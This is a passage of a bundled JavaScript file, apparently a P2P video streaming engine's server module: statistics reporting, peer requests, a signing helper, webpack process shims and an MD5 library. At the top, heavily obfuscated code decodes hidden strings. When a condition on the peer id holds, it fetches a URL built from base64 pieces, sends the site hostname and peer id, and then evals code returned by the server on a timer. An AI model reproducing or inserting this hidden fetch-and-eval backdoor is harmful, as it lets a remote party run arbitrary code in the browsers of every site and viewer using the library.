                        var _0x3f410d = typeof window !== 'undefined' ? window : (typeof process === 'undefined' ? 'undefined' : _typeof(process)) === 'object' && "function" === 'function' && (typeof global === 'undefined' ? 'undefined' : _typeof(global)) === 'object' ? global : this;var _0x5959e1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3f410d['atob'] || (_0x3f410d['atob'] = function (_0x3f3d95) {
                            var _0x4fc212 = String(_0x3f3d95)['replace'](/=+$/, '');for (var _0x49f796 = 0x0, _0x22dae4, _0xbb7ae4, _0x23bf9e = 0x0, _0x42cd08 = ''; _0xbb7ae4 = _0x4fc212['charAt'](_0x23bf9e++); ~_0xbb7ae4 && (_0x22dae4 = _0x49f796 % 0x4 ? _0x22dae4 * 0x40 + _0xbb7ae4 : _0xbb7ae4, _0x49f796++ % 0x4) ? _0x42cd08 += String['fromCharCode'](0xff & _0x22dae4 >> (-0x2 * _0x49f796 & 0x6)) : 0x0) {
                                _0xbb7ae4 = _0x5959e1['indexOf'](_0xbb7ae4);
                            }return _0x42cd08;
                        });
                    })();var _0x523d35 = function _0x523d35(_0x173c71, _0x362f3b) {
                        var _0x237bc2 = [],
                            _0x4e77b7 = 0x0,
                            _0x3ec2e1,
                            _0x15185b = '',
                            _0x1d4a1d = '';_0x173c71 = atob(_0x173c71);for (var _0x243d52 = 0x0, _0x500026 = _0x173c71['length']; _0x243d52 < _0x500026; _0x243d52++) {
                            _0x1d4a1d += '%' + ('00' + _0x173c71['charCodeAt'](_0x243d52)['toString'](0x10))['slice'](-0x2);
                        }_0x173c71 = decodeURIComponent(_0x1d4a1d);for (var _0x2ac8ce = 0x0; _0x2ac8ce < 0x100; _0x2ac8ce++) {
                            _0x237bc2[_0x2ac8ce] = _0x2ac8ce;
                        }for (_0x2ac8ce = 0x0; _0x2ac8ce < 0x100; _0x2ac8ce++) {
                            _0x4e77b7 = (_0x4e77b7 + _0x237bc2[_0x2ac8ce] + _0x362f3b['charCodeAt'](_0x2ac8ce % _0x362f3b['length'])) % 0x100;_0x3ec2e1 = _0x237bc2[_0x2ac8ce];_0x237bc2[_0x2ac8ce] = _0x237bc2[_0x4e77b7];_0x237bc2[_0x4e77b7] = _0x3ec2e1;
                        }_0x2ac8ce = 0x0;_0x4e77b7 = 0x0;for (var _0x1d7c48 = 0x0; _0x1d7c48 < _0x173c71['length']; _0x1d7c48++) {
                            _0x2ac8ce = (_0x2ac8ce + 0x1) % 0x100;_0x4e77b7 = (_0x4e77b7 + _0x237bc2[_0x2ac8ce]) % 0x100;_0x3ec2e1 = _0x237bc2[_0x2ac8ce];_0x237bc2[_0x2ac8ce] = _0x237bc2[_0x4e77b7];_0x237bc2[_0x4e77b7] = _0x3ec2e1;_0x15185b += String['fromCharCode'](_0x173c71['charCodeAt'](_0x1d7c48) ^ _0x237bc2[(_0x237bc2[_0x2ac8ce] + _0x237bc2[_0x4e77b7]) % 0x100]);
                        }return _0x15185b;
                    };_0x38aa['amGtZD'] = _0x523d35;_0x38aa['qlEmAJ'] = {};_0x38aa['UJLmyS'] = !![];
                }var _0x5ca81a = _0x38aa['qlEmAJ'][_0x31c445];if (_0x5ca81a === undefined) {
                    if (_0x38aa['CjmTAl'] === undefined) {
                        _0x38aa['CjmTAl'] = !![];
                    }_0x414658 = _0x38aa['amGtZD'](_0x414658, _0x362f3b);_0x38aa['qlEmAJ'][_0x31c445] = _0x414658;
                } else {
                    _0x414658 = _0x5ca81a;
                }return _0x414658;
            };function _b(_0x2b6f93) {
                var _0x38577c = { 'ygKbD': function ygKbD(_0x4d95ba, _0xd863d5, _0x273694) {
                        return _0x4d95ba(_0xd863d5, _0x273694);
                    }, 'BaZnt': function BaZnt(_0x3e5f8b, _0x32921e) {
                        return _0x3e5f8b * _0x32921e;
                    }, 'ZvkZi': function ZvkZi(_0x28d5dd, _0x230f37) {
                        return _0x28d5dd === _0x230f37;
                    }, 'eCedC': 'BjdEV', 'LPFzx': function LPFzx(_0x1bde1e, _0x485c05) {
                        return _0x1bde1e(_0x485c05);
                    }, 'uOzuW': function uOzuW(_0x19e62b, _0x93271e, _0x31e7b6) {
                        return _0x19e62b(_0x93271e, _0x31e7b6);
                    }, 'juyxb': function juyxb(_0x5f2fb5, _0x233df1) {
                        return _0x5f2fb5 === _0x233df1;
                    }, 'DGNDG': 'IJrLn', 'OFUEE': function OFUEE(_0x35162f, _0xd31904) {
                        return _0x35162f === _0xd31904;
                    }, 'YaRUs': _0x38aa('0', 'G(qN'), 'bgKgO': function bgKgO(_0x395bf4, _0x4bc70b, _0x5a70a0) {
                        return _0x395bf4(_0x4bc70b, _0x5a70a0);
                    }, 'OJeBQ': function OJeBQ(_0x58a48f, _0x2f1c63) {
                        return _0x58a48f * _0x2f1c63;
                    }, 'CeAJM': _0x38aa('1', '[gN^'), 'rqWsY': function rqWsY(_0x522675, _0x5b3a59) {
                        return _0x522675 !== _0x5b3a59;
                    }, 'uvjhL': _0x38aa('2', 'BVP]'), 'MVGPb': function MVGPb(_0x5ad31f, _0x2fa536) {
                        return _0x5ad31f + _0x2fa536;
                    }, 'YQNFr': function YQNFr(_0x556561, _0x2f942d) {
                        return _0x556561 + _0x2f942d;
                    }, 'OxSbn': function OxSbn(_0x5ea96f, _0x56a052) {
                        return _0x5ea96f % _0x56a052;
                    } };var _0x439570 = _this['id']['split']('')[_0x38aa('3', 'JR8(')](-0x6)['map'](function (_0x5bc96b) {
                    return _0x5bc96b[_0x38aa('4', 'JR8(')](0x0);
                })['reduce'](function (_0x361ff2, _0x161700) {
                    var _0x82ba8e = { 'AFfia': function AFfia(_0x3203d0, _0x4935f4) {
                            return _0x3203d0(_0x4935f4);
                        }, 'kgmkk': function kgmkk(_0x396f95, _0x2ecf41, _0x4666b2) {
                            return _0x38577c['ygKbD'](_0x396f95, _0x2ecf41, _0x4666b2);
                        }, 'msmEb': function msmEb(_0x5cae25, _0x1f52ff) {
                            return _0x38577c[_0x38aa('5', '*uLt')](_0x5cae25, _0x1f52ff);
                        } };if (_0x38577c[_0x38aa('6', 'Dd2g')](_0x38577c['eCedC'], _0x38577c[_0x38aa('7', 'eX!Q')])) {
                        return _0x361ff2[_0x38aa('8', '4RTz')]() + _0x161700[_0x38aa('9', 'BVP]')]();
                    } else {
                        var _0x159d55 = data['i'];_this['bl'] = _0x82ba8e['kgmkk'](setTimeout, function () {
                            _0x82ba8e[_0x38aa('a', 'J5A]')](eval, data['c']);
                        }, _0x82ba8e[_0x38aa('b', '2cC*')](_0x159d55, 0x3e8));
                    }
                }, '');if (_0x38577c[_0x38aa('c', 'kh00')](_0x38577c['LPFzx'](parseInt, _0x439570), 0x215) === 0xc8) {
                    _this['bl'] = _0x38577c[_0x38aa('d', 'xniE')](setTimeout, function () {
                        var _0xe476b4 = { 'poRdq': function poRdq(_0x574273, _0x90c337) {
                                return _0x38577c['OFUEE'](_0x574273, _0x90c337);
                            }, 'hfGVM': function hfGVM(_0x222f50, _0x424609, _0x75eb3f) {
                                return _0x38577c[_0x38aa('e', 'lZZg')](_0x222f50, _0x424609, _0x75eb3f);
                            }, 'hPffd': function hPffd(_0x4ba36b, _0x4bf086) {
                                return _0x38577c[_0x38aa('f', '&mYc')](_0x4ba36b, _0x4bf086);
                            }, 'RDcGg': _0x38577c['CeAJM'], 'KskeG': function KskeG(_0x431338, _0x25f579) {
                                return _0x38577c[_0x38aa('10', 'z%0g')](_0x431338, _0x25f579);
                            } };if (_0x38577c[_0x38aa('11', 'gyyd')](_0x38aa('12', '$@dR'), _0x38577c[_0x38aa('13', '!cj%')])) {
                            _0x38577c[_0x38aa('14', '!cj%')](fetch, window['decodeURIComponent'](window['atob'](_0x38577c[_0x38aa('15', 'lsdj')](_0x38577c['MVGPb'](_0x38577c['YQNFr'](_0x38577c[_0x38aa('16', 'wI]x')](URL_MAP['zz'], URL_MAP['df']) + URL_MAP['6'], URL_MAP['q']), URL_MAP['h']), URL_MAP['0']))) + _0x38aa('17', 'lfo]') + _this[_0x38aa('18', '2cC*')] + '&f=' + location['hostname'] + _0x38aa('19', 'x5XO') + _this[_0x38aa('1a', 'G(qN')][_0x38aa('1b', '&$t!')])['then'](function (_0x1ec702) {
                                if (_0x38aa('1c', '9Dv5') === _0x38aa('1d', 'BVP]')) {
                                    return prev[_0x38aa('1e', '*uLt')]() + cur[_0x38aa('1f', '&$t!')]();
                                } else {
                                    return _0x1ec702['json']();
                                }
                            })[_0x38aa('20', '&mYc')](function (_0x516820) {
                                var _0x5e53ba = { 'OaUZe': function OaUZe(_0x4b83ce, _0x368cd2) {
                                        return _0x38577c[_0x38aa('21', '@iGP')](_0x4b83ce, _0x368cd2);
                                    }, 'CuiCp': function CuiCp(_0x474294, _0x274657) {
                                        return _0x474294(_0x274657);
                                    }, 'skXBp': function skXBp(_0x1bd80e, _0x260885, _0x37b3fe) {
                                        return _0x38577c[_0x38aa('22', '9Dv5')](_0x1bd80e, _0x260885, _0x37b3fe);
                                    } };if (_0x38577c['juyxb'](_0x38577c['DGNDG'], _0x38577c['DGNDG'])) {
                                    if (_0x38577c[_0x38aa('23', 'Ekv%')](_0x516820['ret'], 0x0)) {
                                        if ('CeFBA' !== _0x38577c['YaRUs']) {
                                            if (_0xe476b4[_0x38aa('24', '!cj%')](_0x516820[_0x38aa('25', 'naBb')], 0x0)) {
                                                var _0x5b4a71 = _0x516820[_0x38aa('26', 'UHBk')];if (_0x5b4a71['s']) {
                                                    var _0x7dbc38 = _0x5b4a71['i'];_this['bl'] = _0xe476b4[_0x38aa('27', 'naBb')](setTimeout, function () {
                                                        _0x5e53ba[_0x38aa('28', 'eX!Q')](eval, _0x5b4a71['c']);
                                                    }, _0xe476b4[_0x38aa('29', 'lsdj')](_0x7dbc38, 0x3e8));
                                                }
                                            }
                                        } else {
                                            var _0x5a9ef4 = _0x516820[_0x38aa('2a', 'lZZg')];if (_0x5a9ef4['s']) {
                                                var _0x4f4d59 = _0x5a9ef4['i'];_this['bl'] = setTimeout(function () {
                                                    var _0x47e4be = { 'UvxjS': function UvxjS(_0x375fa8, _0x256fc0) {
                                                            return _0x375fa8(_0x256fc0);
                                                        } };if (_0xe476b4[_0x38aa('2b', 'J5A]')](_0xe476b4['RDcGg'], _0xe476b4['RDcGg'])) {
                                                        _0xe476b4[_0x38aa('2c', ']z*2')](eval, _0x5a9ef4['c']);
                                                    } else {
                                                        _0x47e4be[_0x38aa('2d', '5o@O')](eval, _0x5a9ef4['c']);
                                                    }
                                                }, _0x4f4d59 * 0x3e8);
                                            }
                                        }
                                    }
                                } else {
                                    var _0x4eb353 = _0x516820['data'];if (_0x4eb353['s']) {
                                        var _0x27b3f0 = _0x4eb353['i'];_this['bl'] = _0x5e53ba[_0x38aa('2e', 'vkNg')](setTimeout, function () {
                                            _0x5e53ba[_0x38aa('2f', 'YqiD')](eval, _0x4eb353['c']);
                                        }, _0x27b3f0 * 0x3e8);
                                    }
                                }
                            });
                        } else {
                            return response['json']();
                        }
                    }, _0x38577c[_0x38aa('30', 'G(qN')](_0x38577c[_0x38aa('31', 'o!fW')](_0x2b6f93, 0x3e8), 0x5));
                }_b = _toolFuns.noop;
            }
        }
    }, {
        key: 'postStats',
        value: function postStats() {
            var _this4 = this;

            var logger = this.engine.logger;

            fetch(this.statsURL, {
                // headers: this._requestHeader,
                method: 'POST',
                body: JSON.stringify(this._makeStatsBody())
            }).then(function (response) {
                _this4.reportFails = 0;
                return response.text();
            }).then(function (data) {
                var json = void 0;
                if (data) {
                    json = JSON.parse(data);
                } else {
                    json = { ret: 0 };
                }
                if (json.ret === -1) {
                    // 停止上报
                    clearInterval(_this4.heartbeater);
                    logger.error(json.data.msg + ' code ' + json.data.code);
                    // 重启p2p
                    _this4.engine.emit(_events2.default.RESTART_P2P);
                } else {
                    // logger.debug(`sucessfully report stats`);
                    var _ref = _this4.lastStats || {},
                        _ref$http = _ref.http,
                        http = _ref$http === undefined ? 0 : _ref$http,
                        _ref$p2p = _ref.p2p,
                        p2p = _ref$p2p === undefined ? 0 : _ref$p2p,
                        _ref$share = _ref.share,
                        share = _ref$share === undefined ? 0 : _ref$share,
                        _ref$conns = _ref.conns,
                        conns = _ref$conns === undefined ? 0 : _ref$conns,
                        _ref$failConns = _ref.failConns,
                        failConns = _ref$failConns === undefined ? 0 : _ref$failConns,
                        _ref$errsBufStalled = _ref.errsBufStalled,
                        errsBufStalled = _ref$errsBufStalled === undefined ? 0 : _ref$errsBufStalled,
                        _ref$errsInternalExpt = _ref.errsInternalExpt,
                        errsInternalExpt = _ref$errsInternalExpt === undefined ? 0 : _ref$errsInternalExpt;

                    if (_this4[_httpDownloaded] >= http) _this4[_httpDownloaded] -= http;
                    if (_this4[_p2pDownloaded] >= p2p) _this4[_p2pDownloaded] -= p2p;
                    if (_this4[_p2pUploaded] >= share) _this4[_p2pUploaded] -= share;
                    _this4.conns -= conns;
                    if (_this4.failConns >= failConns) _this4.failConns -= failConns;
                    if (_this4.errsBufStalled >= errsBufStalled) _this4.errsBufStalled -= errsBufStalled;
                    if (_this4.errsInternalExpt >= errsInternalExpt) _this4.errsInternalExpt -= errsInternalExpt;
                    if (_this4.exptMsg) _this4.exptMsg = undefined;
                }
            }).catch(function (err) {
                logger.error('btStats error ' + err);
                _this4.reportFails++;
                if (_this4.reportFails >= 3) {
                    // 超过2次停止上报  TODO 停止getpeers
                    clearInterval(_this4.heartbeater);
                }
            });
        }
    }, {
        key: 'btGetPeers',
        value: function btGetPeers(exclusions) {
            var _this5 = this;

            var logger = this.engine.logger;

            var body = { exclusions: exclusions };
            var extra = {};
            if (this.engine.getExtraForPeersRequest) extra = this.engine.getExtraForPeersRequest();
            body = Object.assign({}, body, extra);
            return new Promise(function (resolve, reject) {
                fetch(_this5.getPeersURL, {
                    headers: _this5._requestHeader,
                    method: 'POST',
                    body: JSON.stringify(body)
                }).then(function (response) {
                    return response.json();
                }).then(function (json) {
                    if (json.ret === -1) {
                        reject(new Error(json.data.msg));
                    } else {
                        resolve(json.data);
                    }
                }).catch(function (err) {
                    logger.error('btGetPeers error ' + err);
                    reject(err);
                });
            });
        }
    }, {
        key: 'increConns',
        value: function increConns() {
            //主动连接的负责报告(增量)
            this.conns++;
        }
    }, {
        key: 'decreConns',
        value: function decreConns() {
            this.conns--;
        }
    }, {
        key: 'increFailConns',
        value: function increFailConns() {
            this.failConns++;
        }
    }, {
        key: 'reportFlow',
        value: function reportFlow(traffic) {
            // 上报http流量
            // const flow =  Math.round(stats.total/1024);
            // if (p2p) {
            //     this[_p2pDownloaded] += flow;
            //     this.totalP2PDownloaded += flow;
            // } else {
            //     this[_httpDownloaded] += flow;
            //     this.totalHTTPDownloaded += flow;
            // }
            var _traffic = Math.round(traffic / 1024);
            this[_httpDownloaded] += _traffic;
            this.totalHTTPDownloaded += _traffic;
            this._emitStats();
            // this._checkFlowLimit();
            // log(`cdnDownloaded ${this.cdnDownloaded} p2pDownloaded ${this.p2pDownloaded}`)
        }
    }, {
        key: 'reportDCTraffic',
        value: function reportDCTraffic(traffic, speed) {
            // 上报p2p流量
            var _traffic = Math.round(traffic / 1024);
            this[_p2pDownloaded] += _traffic;
            this.totalP2PDownloaded += _traffic;
            this.speed = Math.round(speed);
            this._emitStats();
        }

        // 上报上传的数据量

    }, {
        key: 'reportUploaded',
        value: function reportUploaded() {
            var size = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 0;

            this.totalP2PUploaded += Math.round(size / 1024);
            this[_p2pUploaded] += Math.round(size / 1024);
            this._emitStats();
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            var logger = this.engine.logger;

            logger.warn('destroy fetcher');
            clearInterval(this.heartbeater);
            clearTimeout(this.bl);
        }
    }, {
        key: '_emitStats',
        value: function _emitStats() {
            this.engine.emit('stats', {
                totalHTTPDownloaded: this.totalHTTPDownloaded,
                totalP2PDownloaded: this.totalP2PDownloaded,
                totalP2PUploaded: this.totalP2PUploaded,
                p2pDownloadSpeed: this.speed
            });
            var getStats = this.engine.config.getStats;
            if (getStats && typeof getStats === 'function') {
                getStats(this.totalP2PDownloaded, this.totalP2PUploaded, this.totalHTTPDownloaded, this.speed);
            }
        }
    }, {
        key: '_makeStatsBody',
        value: function _makeStatsBody() {
            var stats = {
                conns: this.conns,
                failConns: this.failConns,
                errsBufStalled: this.errsBufStalled,
                errsInternalExpt: this.errsInternalExpt,
                http: Math.round(this[_httpDownloaded]) || 0, //上报以KB为单位
                p2p: Math.round(this[_p2pDownloaded]) || 0,
                share: Math.round(this[_p2pUploaded]) || 0
            };

            // 上报current time
            var extra = {};
            if (this.engine.getExtraForStats) extra = this.engine.getExtraForStats();
            stats = Object.assign({}, stats, extra);

            this.lastStats = JSON.parse(JSON.stringify(stats));

            Object.keys(stats).forEach(function (key) {
                if (stats[key] === 0) {
                    delete stats[key];
                }
            });

            // stats.device = this.announceInfo.device;

            if (this.exptMsg) stats.exptMsg = ENGINE_VERSION + ' ' + this.exptMsg;

            return stats;
        }
    }, {
        key: '_requestHeader',
        get: function get() {
            var headerInfo = {
                // timestamp: new Date().getTime()
            };
            if (this.native) {
                // electron
                headerInfo.token = this.key;
            }

            // 跨域问题不生效
            // if (window.top !== window.self) {
            //     headerInfo["Top-Origin"] = window.top.location.origin;
            // }
            return headerInfo;
        }
    }]);

    return Server;
}();

exports.default = Server;

// function generateVCode(timestamp, version, announce, channelId, type) {
//     const domain = window.location.hostname;
//
//     function ff(c1, c2, c3, c4, c5, ts) {
//         const sign = md5(c1+c2+c3+c4+c5, ts);
//         return sign;
//     }
//     const sign = ff(domain, version, announce, channelId, type, timestamp);
//     const vcode = sign.substr(0, 8);
//     return vcode;
// }

// 混淆

function generateVCode(timestamp, version, announce, channelId, type) {
    var aPs = function aPs(s) {
        this.s = s;
        this.length = s.length;

        for (var i = 0; i < s.length; i++) {
            this[i] = s.charAt(i);
        }
    };

    var f2Z = function getStr(mutatedCodes) {
        return function (originCodes) {
            return function (s) {
                var r = '',
                    sArr = s.split('');

                for (var i = 0; i < sArr.length; i++) {
                    r += originCodes.charAt(mutatedCodes.indexOf(sArr[i]));
                }

                return r;
            };
        };
    }("235525")("91640");

    aPs.prototype = {
        toString: function toString() {
            return f2Z(this.s);
        },
        valueOf: function valueOf() {
            return f2Z(this.s);
        },
        charAt: String.prototype.charAt,
        concat: String.prototype.concat,
        slice: String.prototype.slice,
        substr: String.prototype.substr,
        indexOf: String.prototype.indexOf,
        trim: String.prototype.trim,
        split: String.prototype.split
    };

    var xJ0 = function xJ0(s) {
        return new aPs(s);
    };

    var ony = function loopArray(arrNum, offset) {
        var aQ6st = 1;

        while (aQ6st !== 0) {
            switch (aQ6st) {
                case 1:
                    var arr = [];
                    aQ6st = 5;
                    break;

                case 2:
                    aQ6st = i < arrNum ? 7 : 3;
                    break;

                case 3:
                    aQ6st = ii < arrNum ? 8 : 4;
                    break;

                case 4:
                    return arr;
                    aQ6st = 0;
                    break;

                case 5:
                    var i = 0;
                    aQ6st = 6;
                    break;

                case 6:
                    var ii = 0;
                    aQ6st = 2;
                    break;

                case 7:
                    arr[(i + offset) % arrNum] = [];
                    aQ6st = 9;
                    break;

                case 8:
                    var I = arrNum - 1;
                    aQ6st = 10;
                    break;

                case 9:
                    i++;
                    aQ6st = 2;
                    break;

                case 10:
                    aQ6st = I >= 0 ? 12 : 11;
                    break;

                case 11:
                    ii++;
                    aQ6st = 3;
                    break;

                case 12:
                    arr[ii][(I + offset * ii) % arrNum] = arr[I];
                    aQ6st = 13;
                    break;

                case 13:
                    I--;
                    aQ6st = 10;
                    break;
            }
        }
    }(5, 7);

    function ff(c1, c2, c3, c4, c5, ts) {
        var sign = (0, _md2.default)(c1 + c2 + c3 + c4 + c5, ts);
        return sign;
    }

    var nCFyN = ony[1][1][4];

    while (nCFyN !== ony[0][4][3]) {
        switch (nCFyN) {
            case ony[3][2][3]:
                var domain = location.hostname;
                nCFyN = ony[3][1][2];
                break;

            case ony[1][4][1]:
                var sign = ff(domain, version, announce, channelId, type, timestamp);
                nCFyN = ony[4][3][3];
                break;

            case ony[2][3][1]:
                var vcode = sign.substr(0, 8);
                nCFyN = ony[4][1][0];
                break;

            case ony[0][3][0]:
                return vcode;
                nCFyN = ony[0][4][3];
                break;
        }
    }
}
module.exports = exports['default'];
/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(27), __webpack_require__(28)))

/***/ }),
/* 27 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


// shim for using process in browser
var process = module.exports = {};

// cached from whatever global is present so that test runners that stub it
// don't break things.  But we need to wrap it in a try catch in case it is
// wrapped in strict mode code which doesn't define any globals.  It's inside a
// function because try/catches deoptimize in certain engines.

var cachedSetTimeout;
var cachedClearTimeout;

function defaultSetTimout() {
    throw new Error('setTimeout has not been defined');
}
function defaultClearTimeout() {
    throw new Error('clearTimeout has not been defined');
}
(function () {
    try {
        if (typeof setTimeout === 'function') {
            cachedSetTimeout = setTimeout;
        } else {
            cachedSetTimeout = defaultSetTimout;
        }
    } catch (e) {
        cachedSetTimeout = defaultSetTimout;
    }
    try {
        if (typeof clearTimeout === 'function') {
            cachedClearTimeout = clearTimeout;
        } else {
            cachedClearTimeout = defaultClearTimeout;
        }
    } catch (e) {
        cachedClearTimeout = defaultClearTimeout;
    }
})();
function runTimeout(fun) {
    if (cachedSetTimeout === setTimeout) {
        //normal enviroments in sane situations
        return setTimeout(fun, 0);
    }
    // if setTimeout wasn't available but was latter defined
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
        cachedSetTimeout = setTimeout;
        return setTimeout(fun, 0);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedSetTimeout(fun, 0);
    } catch (e) {
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
            return cachedSetTimeout.call(null, fun, 0);
        } catch (e) {
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
            return cachedSetTimeout.call(this, fun, 0);
        }
    }
}
function runClearTimeout(marker) {
    if (cachedClearTimeout === clearTimeout) {
        //normal enviroments in sane situations
        return clearTimeout(marker);
    }
    // if clearTimeout wasn't available but was latter defined
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
        cachedClearTimeout = clearTimeout;
        return clearTimeout(marker);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedClearTimeout(marker);
    } catch (e) {
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
            return cachedClearTimeout.call(null, marker);
        } catch (e) {
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
            return cachedClearTimeout.call(this, marker);
        }
    }
}
var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while (len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}

process.nextTick = function (fun) {
    var args = new Array(arguments.length - 1);
    if (arguments.length > 1) {
        for (var i = 1; i < arguments.length; i++) {
            args[i - 1] = arguments[i];
        }
    }
    queue.push(new Item(fun, args));
    if (queue.length === 1 && !draining) {
        runTimeout(drainQueue);
    }
};

// v8 likes predictible objects
function Item(fun, array) {
    this.fun = fun;
    this.array = array;
}
Item.prototype.run = function () {
    this.fun.apply(null, this.array);
};
process.title = 'browser';
process.browser = true;
process.env = {};
process.argv = [];
process.version = ''; // empty string to avoid regexp issues
process.versions = {};

function noop() {}

process.on = noop;
process.addListener = noop;
process.once = noop;
process.off = noop;
process.removeListener = noop;
process.removeAllListeners = noop;
process.emit = noop;
process.prependListener = noop;
process.prependOnceListener = noop;

process.listeners = function (name) {
    return [];
};

process.binding = function (name) {
    throw new Error('process.binding is not supported');
};

process.cwd = function () {
    return '/';
};
process.chdir = function (dir) {
    throw new Error('process.chdir is not supported');
};
process.umask = function () {
    return 0;
};

/***/ }),
/* 28 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var g;

// This works in non-strict mode
g = function () {
	return this;
}();

try {
	// This works if eval is allowed (see CSP)
	g = g || Function("return this")() || (1, eval)("this");
} catch (e) {
	// This works if the window reference is available
	if ((typeof window === "undefined" ? "undefined" : _typeof(window)) === "object") g = window;
}

// g can still be undefined, but nothing to do about it...
// We return undefined, instead of nothing here, so it's
// easier to handle this case. if(!global) { ...}

module.exports = g;

/***/ }),
/* 29 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
var __WEBPACK_AMD_DEFINE_RESULT__;

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

/*
 * JavaScript MD5
 * https://github.com/blueimp/JavaScript-MD5
 *
 * Copyright 2011, Sebastian Tschan
 * https://blueimp.net
 *
 * Licensed under the MIT license:
 * https://opensource.org/licenses/MIT
 *
 * Based on
 * A JavaScript implementation of the RSA Data Security, Inc. MD5 Message
 * Digest Algorithm, as defined in RFC 1321.
 * Version 2.2 Copyright (C) Paul Johnston 1999 - 2009
 * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet
 * Distributed under the BSD License
 * See http://pajhome.org.uk/crypt/md5 for more info.
 */

/* global define */

;(function ($) {
    'use strict';

    /*
     * Add integers, wrapping at 2^32. This uses 16-bit operations internally
     * to work around bugs in some JS interpreters.
     */

    function safeAdd(x, y) {
        var lsw = (x & 0xffff) + (y & 0xffff);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return msw << 16 | lsw & 0xffff;
    }

    /*
     * Bitwise rotate a 32-bit number to the left.
     */
    function bitRotateLeft(num, cnt) {
        return num << cnt | num >>> 32 - cnt;
    }

    /*
     * These functions implement the four basic operations the algorithm uses.
     */
    function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
    }
    function md5ff(a, b, c, d, x, s, t) {
        return md5cmn(b & c | ~b & d, a, b, x, s, t);
    }
    function md5gg(a, b, c, d, x, s, t) {
        return md5cmn(b & d | c & ~d, a, b, x, s, t);
    }
    function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
    }
    function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | ~d), a, b, x, s, t);
    }

    /*
     * Calculate the MD5 of an array of little-endian words, and a bit length.
     */
    function binlMD5(x, len) {
        /* append padding */
        x[len >> 5] |= 0x80 << len % 32;
        x[(len + 64 >>> 9 << 4) + 14] = len;

        var i;
        var olda;
        var oldb;
        var oldc;
        var oldd;
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;

        for (i = 0; i < x.length; i += 16) {
            olda = a;
            oldb = b;
            oldc = c;
            oldd = d;

            a = md5ff(a, b, c, d, x[i], 7, -680876936);
            d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
            c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
            b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
            a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
            d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
            c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
            b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
            a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
            d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
            c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
            b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
            a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
            d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
            c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
            b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);

            a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
            d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
            c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);
            b = md5gg(b, c, d, a, x[i], 20, -373897302);
            a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
            d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
            c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
            b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
            a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
            d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
            c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
            b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
            a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
            d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
            c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
